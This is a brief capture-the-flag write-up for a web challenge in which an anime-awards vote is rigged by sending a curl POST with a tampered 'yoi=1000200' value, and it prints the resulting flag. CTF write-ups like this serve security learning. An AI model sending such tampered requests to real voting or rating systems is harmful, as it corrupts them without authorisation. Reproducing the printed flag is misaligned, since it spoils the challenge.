# Cringeyroll
Are you ready? - 0 points

## Challenge 
> Here comes the anime awards! However, other mainstream anime are winning! As a fangirl of Yuri On Ice, I'm getting triggered. Hack the awards and make the points of Yuri On Ice 1000000! I'll give you the flag if you manage to.
>
> http://san.chal.gryphonctf.com:17122
>
> Creator @Platy

## Solution
Rating on reviews can be submitted only once with 1-5 rating.
Checking the page source, it does a POST request of `yoi=1` if we rate Yuri On Ice with +1

Do a manual POST request 

	$ curl -s --data 'yoi=1000200' http://san.chal.gryphonctf.com:17122 | html2text | grep "GCTF"
	GCTF{7h3_4n1m3_4w4rd5_w3r3_r1663d}

## Flag
`GCTF{7h3_4n1m3_4w4rd5_w3r3_r1663d}`